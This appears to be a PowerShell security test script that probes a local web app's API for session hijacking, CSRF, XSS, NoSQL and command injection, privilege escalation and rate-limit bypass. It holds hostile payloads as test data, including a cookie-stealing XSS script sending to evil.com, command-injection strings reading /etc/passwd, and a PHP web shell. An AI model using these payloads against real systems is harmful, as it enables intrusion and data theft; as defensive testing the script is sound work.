# Test-SecurityEdgeCases.ps1
# Tests security vulnerabilities including session hijacking, CSRF, input sanitization
# Location: credit-gyems-academy/scripts/TS_CGA_v1/

param(
    [string]$ProjectRoot,
    [switch]$DestructiveTests  # Enable potentially destructive security tests
)

# Get script root if not already set
if (-not $ScriptRoot) {
    $ScriptRoot = Split-Path -Parent -Path $MyInvocation.MyCommand.Definition
}

. "$PSScriptRoot\Test-Utilities.ps1"

Write-TestHeader "ADVANCED SECURITY EDGE CASE TESTS"

# Initialize security test results
$Global:SecurityTestResults = @{
    SessionTests = @()
    CSRFTests = @()
    InputSanitization = @()
    AuthorizationTests = @()
    InjectionTests = @()
}

Write-TestSection "SESSION HIJACKING PREVENTION"

Write-TestStep 1 "Testing session token security"

# Create a victim user
$victimUser = Get-RandomTestUser
$victimResult = Test-APIEndpoint `
    -Method "POST" `
    -Endpoint "http://localhost:5000/api/auth/register" `
    -Body $victimUser

if ($victimResult.Success) {
    $victimToken = $victimResult.Data.token
    Write-TestSuccess "Victim user created"
    
    # Test 1: Token modification attempts
    $modifiedTokens = @(
        $victimToken.Substring(0, $victimToken.Length - 5) + "AAAAA",  # Modified end
        "Bearer " + $victimToken,  # Double Bearer prefix
        $victimToken.Replace(".", "_"),  # Modified structure
        [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($victimToken))  # Re-encoded
    )
    
    foreach ($token in $modifiedTokens) {
        $hijackResult = Test-APIEndpoint `
            -Method "GET" `
            -Endpoint "http://localhost:5000/api/auth/profile" `
            -Headers @{ Authorization = "Bearer $token" } `
            -ExpectedStatus "401"
        
        if ($hijackResult.Success) {
            Write-TestSuccess "Modified token rejected"
        } else {
            Write-TestFailure "Modified token accepted!"
            $Global:SecurityTestResults.SessionTests += @{
                Type = "TokenModification"
                Vulnerability = $true
            }
        }
    }
    
    # Test 2: Session fixation attempt
    $attackerUser = Get-RandomTestUser
    $attackerResult = Test-APIEndpoint `
        -Method "POST" `
        -Endpoint "http://localhost:5000/api/auth/register" `
        -Body $attackerUser
    
    if ($attackerResult.Success) {
        # Try to use victim's token from attacker's IP/context
        $sessionFixationResult = Test-APIEndpoint `
            -Method "GET" `
            -Endpoint "http://localhost:5000/api/auth/profile" `
            -Headers @{ 
                Authorization = "Bearer $victimToken"
                "X-Forwarded-For" = "192.168.100.100"  # Different IP
                "User-Agent" = "HackerBot/1.0"  # Different UA
            }
        
        if ($sessionFixationResult.Success) {
            Write-TestWarning "Token accepted from different context - consider implementing device fingerprinting"
            $Global:SecurityTestResults.SessionTests += @{
                Type = "SessionFixation"
                Vulnerability = "Partial"
            }
        }
    }
}

Write-TestStep 2 "Testing concurrent session limits"

# Test if system prevents too many active sessions
$sessionTokens = @()
for ($i = 1; $i -le 10; $i++) {
    $loginResult = Test-APIEndpoint `
        -Method "POST" `
        -Endpoint "http://localhost:5000/api/auth/login" `
        -Body @{
            email = $victimUser.email
            password = $victimUser.password
        } `
        -Headers @{ "User-Agent" = "Device-$i" }
    
    if ($loginResult.Success) {
        $sessionTokens += $loginResult.Data.token
    }
}

Write-TestInfo "Active sessions created: $($sessionTokens.Count)"
if ($sessionTokens.Count -ge 10) {
    Write-TestWarning "No limit on concurrent sessions - potential security risk"
    $Global:SecurityTestResults.SessionTests += @{
        Type = "UnlimitedSessions"
        Count = $sessionTokens.Count
    }
}

Write-TestSection "CSRF PROTECTION TESTING"

Write-TestStep 3 "Testing CSRF token validation"

# Get CSRF token from a legitimate request
$csrfTestUser = $Global:PrimaryTestUser
if ($csrfTestUser) {
    # Make initial request to get CSRF token
    $initialResult = Test-APIEndpoint `
        -Method "GET" `
        -Endpoint "http://localhost:5000/api/auth/csrf-token" `
        -Headers @{ Authorization = "Bearer $($csrfTestUser.token)" }
    
    if ($initialResult.Success -and $initialResult.Data.csrfToken) {
        $legitimateCSRF = $initialResult.Data.csrfToken
        Write-TestSuccess "CSRF token obtained"
        
        # Test 1: Request without CSRF token
        $noCSRFResult = Test-APIEndpoint `
            -Method "POST" `
            -Endpoint "http://localhost:5000/api/auth/profile" `
            -Headers @{ Authorization = "Bearer $($csrfTestUser.token)" } `
            -Body @{ creditScore = 800 } `
            -ExpectedStatus "403"
        
        if ($noCSRFResult.Success) {
            Write-TestSuccess "Request without CSRF token rejected"
            
            # Test with legitimate CSRF token
            $validCSRFResult = Test-APIEndpoint `
                -Method "POST" `
                -Endpoint "http://localhost:5000/api/auth/profile" `
                -Headers @{ 
                    Authorization = "Bearer $($csrfTestUser.token)"
                    "X-CSRF-Token" = $legitimateCSRF
                } `
                -Body @{ creditScore = 800 }
            
            if ($validCSRFResult.Success) {
                Write-TestSuccess "Request with valid CSRF token accepted"
            }
        } else {
            Write-TestWarning "CSRF protection may not be enabled"
            $Global:SecurityTestResults.CSRFTests += @{
                Type = "MissingCSRFProtection"
                Endpoint = "/api/auth/profile"
            }
        }
        
        # Test 2: Request with invalid CSRF token
        $invalidCSRFResult = Test-APIEndpoint `
            -Method "POST" `
            -Endpoint "http://localhost:5000/api/auth/profile" `
            -Headers @{ 
                Authorization = "Bearer $($csrfTestUser.token)"
                "X-CSRF-Token" = "invalid_csrf_token_12345"
            } `
            -Body @{ creditScore = 800 } `
            -ExpectedStatus "403"
        
        if ($invalidCSRFResult.Success) {
            Write-TestSuccess "Invalid CSRF token rejected"
        }
        
        # Test 3: Cross-origin request simulation
        $crossOriginHeaders = @{
            Authorization = "Bearer $($csrfTestUser.token)"
            Origin = "http://evil-site.com"
            Referer = "http://evil-site.com/attack"
        }
        
        $crossOriginResult = Test-APIEndpoint `
            -Method "POST" `
            -Endpoint "http://localhost:5000/api/orders" `
            -Headers $crossOriginHeaders `
            -Body @{
                items = @(@{ productId = "test"; quantity = 1 })
                paymentMethod = @{ type = "card" }
            } `
            -ExpectedStatus "403"
        
        if ($crossOriginResult.Success) {
            Write-TestSuccess "Cross-origin request blocked"
        } else {
            Write-TestFailure "Cross-origin request allowed!"
            $Global:SecurityTestResults.CSRFTests += @{
                Type = "CrossOriginAllowed"
                Vulnerability = $true
            }
        }
    } else {
        Write-TestWarning "CSRF tokens not implemented"
    }
}

Write-TestSection "INPUT SANITIZATION TESTS"

Write-TestStep 4 "Testing XSS prevention in all input fields"

$xssPayloads = @(
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src='javascript:alert(`XSS`)'></iframe>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<button onclick=alert('XSS')>Click</button>",
    "<div onmouseover=alert('XSS')>Hover</div>",
    "';alert('XSS');//",
    '";alert("XSS");//',
    "<script>document.location='http://evil.com?cookie='+document.cookie</script>"
)

# Test registration fields
foreach ($payload in $xssPayloads) {
    $xssUser = @{
        email = Get-RandomTestEmail
        password = "Test123!"
        firstName = $payload
        lastName = "Test"
        phone = "555-0000"
    }
    
    $xssResult = Test-APIEndpoint `
        -Method "POST" `
        -Endpoint "http://localhost:5000/api/auth/register" `
        -Body $xssUser
    
    if ($xssResult.Success) {
        # Check if payload was sanitized
        $profileResult = Test-APIEndpoint `
            -Method "GET" `
            -Endpoint "http://localhost:5000/api/auth/profile" `
            -Headers @{ Authorization = "Bearer $($xssResult.Data.token)" }
        
        if ($profileResult.Success) {
            $storedFirstName = $profileResult.Data.firstName
            if ($storedFirstName -eq $payload) {
                Write-TestFailure "XSS payload stored without sanitization!"
                $Global:SecurityTestResults.InputSanitization += @{
                    Type = "XSS"
                    Field = "firstName"
                    Payload = $payload
                    Vulnerability = $true
                }
            } else {
                Write-TestSuccess "XSS payload sanitized: $($payload.Substring(0, [Math]::Min(20, $payload.Length)))..."
            }
        }
    }
}

Write-TestStep 5 "Testing SQL/NoSQL injection prevention"

$injectionPayloads = @(
    @{
        Type = "NoSQL"
        Payloads = @(
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$where": "this.password.length > 0"}',
            '{"password": {"$regex": ".*"}}',
            '{"$or": [{"email": "admin@test.com"}, {"email": {"$exists": true}}]}'
        )
    },
    @{
        Type = "Command"
        Payloads = @(
            "; ls -la",
            "| whoami",
            '` whoami `',
            '$(whoami)',
            "&& Get-Content /etc/passwd"
        )
    }
)

foreach ($test in $injectionPayloads) {
    foreach ($payload in $test.Payloads) {
        # Test in email field (login endpoint)
        $injectionResult = Test-APIEndpoint `
            -Method "POST" `
            -Endpoint "http://localhost:5000/api/auth/login" `
            -Body @{
                email = $payload
                password = "test"
            } `
            -ExpectedStatus "400"
        
        if ($injectionResult.Success) {
            Write-TestSuccess "$($test.Type) injection blocked"
        } else {
            Write-TestFailure "$($test.Type) injection not properly handled"
            $Global:SecurityTestResults.InjectionTests += @{
                Type = $test.Type
                Payload = $payload
                Vulnerability = $true
            }
        }
    }
}

Write-TestStep 6 "Testing file upload security"

if ($DestructiveTests) {
    # Test malicious file uploads
    $maliciousFiles = @(
        @{
            Name = "shell.php"
            Content = '<?php system($_GET["cmd"]); ?>'
            Type = "application/x-php"
        },
        @{
            Name = "exploit.js"
            Content = "require('child_process').exec('whoami')"
            Type = "application/javascript"
        },
        @{
            Name = "eicar.txt"
            Content = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
            Type = "text/plain"
        }
    )
    
    foreach ($file in $maliciousFiles) {
        # This would need actual file upload implementation
        Write-TestInfo "Would test upload of: $($file.Name)"
    }
} else {
    Write-TestInfo "Destructive file upload tests skipped (use -DestructiveTests to enable)"
}

Write-TestSection "AUTHORIZATION BYPASS ATTEMPTS"

Write-TestStep 7 "Testing horizontal privilege escalation"

# Create two regular users
$user1 = Get-RandomTestUser
$user2 = Get-RandomTestUser

$user1Result = Test-APIEndpoint `
    -Method "POST" `
    -Endpoint "http://localhost:5000/api/auth/register" `
    -Body $user1

$user2Result = Test-APIEndpoint `
    -Method "POST" `
    -Endpoint "http://localhost:5000/api/auth/register" `
    -Body $user2

if ($user1Result.Success -and $user2Result.Success) {
    $user1Token = $user1Result.Data.token
    $user2Id = $user2Result.Data.user.id
    
    # User1 tries to access User2's data
    $horizontalTests = @(
        @{
            Endpoint = "/api/orders"
            Params = "?userId=$user2Id"
        },
        @{
            Endpoint = "/api/bookings/user/$user2Id"
            Params = ""
        },
        @{
            Endpoint = "/api/users/$user2Id/profile"
            Params = ""
        }
    )
    
    foreach ($test in $horizontalTests) {
        $url = "http://localhost:5000$($test.Endpoint)$($test.Params)"
        $accessResult = Test-APIEndpoint `
            -Method "GET" `
            -Endpoint $url `
            -Headers @{ Authorization = "Bearer $user1Token" } `
            -ExpectedStatus "403"
        
        if ($accessResult.Success) {
            Write-TestSuccess "Horizontal access blocked: $($test.Endpoint)"
        } else {
            if ($accessResult.StatusCode -eq 200) {
                Write-TestFailure "Horizontal privilege escalation possible!"
                $Global:SecurityTestResults.AuthorizationTests += @{
                    Type = "HorizontalEscalation"
                    Endpoint = $test.Endpoint
                    Vulnerability = $true
                }
            }
        }
    }
}

Write-TestStep 8 "Testing vertical privilege escalation"

# Regular user tries to access admin endpoints
if ($user1Token) {
    $adminEndpoints = @(
        @{ Method = "GET"; Path = "/api/admin/users" },
        @{ Method = "GET"; Path = "/api/leads/analytics" },
        @{ Method = "POST"; Path = "/api/products"; Body = @{ title = "Test" } },
        @{ Method = "DELETE"; Path = "/api/users/123456" },
        @{ Method = "PUT"; Path = "/api/users/$user2Id/role"; Body = @{ role = "admin" } }
    )
    
    foreach ($endpoint in $adminEndpoints) {
        $escalationResult = Test-APIEndpoint `
            -Method $endpoint.Method `
            -Endpoint "http://localhost:5000$($endpoint.Path)" `
            -Headers @{ Authorization = "Bearer $user1Token" } `
            -Body $endpoint.Body `
            -ExpectedStatus "403"
        
        if ($escalationResult.Success) {
            Write-TestSuccess "Admin endpoint protected: $($endpoint.Path)"
        } else {
            if ($escalationResult.StatusCode -eq 200) {
                Write-TestFailure "Vertical privilege escalation possible!"
                $Global:SecurityTestResults.AuthorizationTests += @{
                    Type = "VerticalEscalation"
                    Endpoint = $endpoint.Path
                    Vulnerability = $true
                }
            }
        }
    }
}

Write-TestSection "BUSINESS LOGIC SECURITY"

Write-TestStep 9 "Testing negative amount exploits"

if ($csrfTestUser) {
    # Try negative amounts in various endpoints
    $negativeTests = @(
        @{
            Name = "Negative refund"
            Endpoint = "/api/orders/test/refund"
            Body = @{ refundAmount = -100; reason = "test" }
        },
        @{
            Name = "Negative product price"
            Endpoint = "/api/cart/add"
            Body = @{ productId = "test"; quantity = -5; type = "product" }
        },
        @{
            Name = "Negative payment"
            Endpoint = "/api/orders"
            Body = @{ 
                items = @(@{ productId = "test"; quantity = 1; price = -50 })
                totalAmount = -50
            }
        }
    )
    
    foreach ($test in $negativeTests) {
        $result = Test-APIEndpoint `
            -Method "POST" `
            -Endpoint "http://localhost:5000$($test.Endpoint)" `
            -Headers @{ Authorization = "Bearer $($csrfTestUser.token)" } `
            -Body $test.Body `
            -ExpectedStatus "400"
        
        if ($result.Success) {
            Write-TestSuccess "Negative amount blocked: $($test.Name)"
        } else {
            Write-TestFailure "Negative amount accepted: $($test.Name)"
            $Global:SecurityTestResults.InputSanitization += @{
                Type = "NegativeAmount"
                Test = $test.Name
                Vulnerability = $true
            }
        }
    }
}

Write-TestStep 10 "Testing rate limiting bypass attempts"

# Common rate limit bypass techniques
$bypassHeaders = @(
    @{ "X-Forwarded-For" = "1.2.3.4" },
    @{ "X-Real-IP" = "5.6.7.8" },
    @{ "X-Originating-IP" = "9.10.11.12" },
    @{ "CF-Connecting-IP" = "13.14.15.16" },
    @{ "True-Client-IP" = "17.18.19.20" }
)

$endpoint = "http://localhost:5000/api/auth/login"
$loginAttempts = 0

foreach ($headers in $bypassHeaders) {
    for ($i = 1; $i -le 10; $i++) {
        $result = Test-APIEndpoint `
            -Method "POST" `
            -Endpoint $endpoint `
            -Headers $headers `
            -Body @{
                email = "test@test.com"
                password = "wrong$i"
            } `
            -ExpectedStatus "401"
        
        $loginAttempts++
        
        if ($result.StatusCode -eq 429) {
            Write-TestSuccess "Rate limiting enforced after $loginAttempts attempts"
            break
        }
    }
}

if ($loginAttempts -ge 50) {
    Write-TestWarning "Rate limiting may be bypassed with header manipulation"
    $Global:SecurityTestResults.SessionTests += @{
        Type = "RateLimitBypass"
        Attempts = $loginAttempts
    }
}

Write-TestSection "SECURITY TEST SUMMARY"

Write-Host "`n" -NoNewline
Write-Host "═══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "                 SECURITY TEST SUMMARY                          " -ForegroundColor Cyan
Write-Host "═══════════════════════════════════════════════════════════════" -ForegroundColor Cyan

# Calculate vulnerability counts
$sessionVulns = ($Global:SecurityTestResults.SessionTests | Where-Object { $_.Vulnerability }).Count
$csrfVulns = ($Global:SecurityTestResults.CSRFTests | Where-Object { $_.Vulnerability }).Count
$xssVulns = ($Global:SecurityTestResults.InputSanitization | Where-Object { $_.Type -eq "XSS" -and $_.Vulnerability }).Count
$injectionVulns = ($Global:SecurityTestResults.InjectionTests | Where-Object { $_.Vulnerability }).Count
$authVulns = ($Global:SecurityTestResults.AuthorizationTests | Where-Object { $_.Vulnerability }).Count

Write-Host "`nVulnerability Summary:" -ForegroundColor White
Write-Host "  • Session Security: $(if ($sessionVulns -eq 0) { 'SECURE' } else { "$sessionVulns issues found" })" -ForegroundColor $(if ($sessionVulns -eq 0) { 'Green' } else { 'Red' })
Write-Host "  • CSRF Protection: $(if ($csrfVulns -eq 0) { 'SECURE' } else { "$csrfVulns issues found" })" -ForegroundColor $(if ($csrfVulns -eq 0) { 'Green' } else { 'Red' })
Write-Host "  • XSS Prevention: $(if ($xssVulns -eq 0) { 'SECURE' } else { "$xssVulns issues found" })" -ForegroundColor $(if ($xssVulns -eq 0) { 'Green' } else { 'Red' })
Write-Host "  • Injection Defense: $(if ($injectionVulns -eq 0) { 'SECURE' } else { "$injectionVulns issues found" })" -ForegroundColor $(if ($injectionVulns -eq 0) { 'Green' } else { 'Red' })
Write-Host "  • Authorization: $(if ($authVulns -eq 0) { 'SECURE' } else { "$authVulns issues found" })" -ForegroundColor $(if ($authVulns -eq 0) { 'Green' } else { 'Red' })

$totalVulns = $sessionVulns + $csrfVulns + $xssVulns + $injectionVulns + $authVulns
Write-Host "`nOverall Security Status: " -NoNewline
if ($totalVulns -eq 0) {
    Write-Host "SECURE" -ForegroundColor Green
    Write-Host "No critical vulnerabilities detected." -ForegroundColor Green
} else {
    Write-Host "AT RISK" -ForegroundColor Red
    Write-Host "$totalVulns critical vulnerabilities require immediate attention!" -ForegroundColor Red
}

# Save security report
$securityReportPath = Join-Path $ProjectRoot "test-reports\security-audit-$(Get-Date -Format 'yyyyMMdd-HHmmss').json"
$Global:SecurityTestResults | ConvertTo-Json -Depth 10 | Out-File $securityReportPath -Encoding UTF8
Write-TestInfo "`nDetailed security report saved to: $securityReportPath"

if ($totalVulns -gt 0) {
    Write-Host "`nRECOMMENDED ACTIONS:" -ForegroundColor Yellow
    Write-Host "1. Review the detailed security report" -ForegroundColor White
    Write-Host "2. Prioritize fixing authentication and authorization issues" -ForegroundColor White
    Write-Host "3. Implement proper input sanitization" -ForegroundColor White
    Write-Host "4. Add CSRF protection if missing" -ForegroundColor White
    Write-Host "5. Consider a professional security audit" -ForegroundColor White
}